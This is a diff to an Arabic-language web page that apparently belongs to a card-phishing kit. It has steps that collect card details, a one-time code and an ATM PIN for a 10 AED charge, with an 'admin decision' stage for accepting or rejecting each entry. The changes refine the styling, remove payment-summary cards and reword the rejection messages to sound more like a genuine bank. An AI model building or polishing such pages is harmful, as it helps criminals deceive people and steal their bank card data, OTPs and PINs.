@@ -233,7 +233,8 @@
             justify-content: center;
             font-size: 26px;
         }
-        .step-ic.atm { background: #fff4e6; border-color: #ffe1b4; }
+        .step-ic.atm { background: #ffffff; border-color: #e0e7ff; }
+        .step-ic { box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08); }
         .step-center h3 { font-size: 20px; font-weight: 700; color: #33475b; }
         .step-center p.sub { margin-top: 10px; font-size: 14px; color: #5b6b7f; line-height: 1.75; }
         .step-center .big-input {
@@ -398,12 +399,6 @@
         <!-- STEP 2: OTP -->
         <div id="pg-otp" class="hidden">
             <div class="card">
-                <div class="card-head">ملخص الدفع</div>
-                <div class="card-body">
-                    <div class="row total"><span class="lbl">المبلغ المستحق</span><span class="val" id="sum-total-2">10 AED</span></div>
-                </div>
-            </div>
-            <div class="card">
                 <div class="card-head">التحقق الأمني للبطاقة</div>
                 <div class="card-body">
                     <div class="step-center">
@@ -422,12 +417,6 @@
 
         <!-- STEP 3: ATM PIN -->
         <div id="pg-atm" class="hidden">
-            <div class="card">
-                <div class="card-head">ملخص الدفع</div>
-                <div class="card-body">
-                    <div class="row total"><span class="lbl">المبلغ المستحق</span><span class="val" id="sum-total-3">10 AED</span></div>
-                </div>
-            </div>
             <div class="card">
                 <div class="card-head">التحقق من رمز PIN</div>
                 <div class="card-body">
@@ -591,9 +580,9 @@
 
         // ---------------- انتظار قرار الأدمن (قبول / رفض) ----------------
         const REJECT_MESSAGES = {
-            card: 'فشلت عملية الدفع. قد تكون بطاقتك غير مفعلة للدفع عبر الإنترنت. يرجى استخدام طرق دفع مختلفة أو التواصل مع البنك.',
-            otp: 'الرمز الذي تم إدخاله غير صحيح وغير صالح. يرجى التحقق من الرمز الصحيح وإعادة المحاولة.',
-            pin: 'الرقم السري للصراف الآلي غير صحيح. يرجى التحقق من الرمز الصحيح وإعادة المحاولة.'
+            card: 'عذراً، لم نتمكن من إتمام العملية. يرجى التحقق من بيانات البطاقة أو المحاولة مرة أخرى لاحقاً.',
+            otp: 'رمز التحقق (OTP) غير صحيح. يرجى التأكد من الرمز المرسل وإعادة المحاولة.',
+            pin: 'رقم PIN غير صحيح. يرجى التحقق من الرقم والمحاولة مرة أخرى.'
         };
 
         let decideTimer = null;
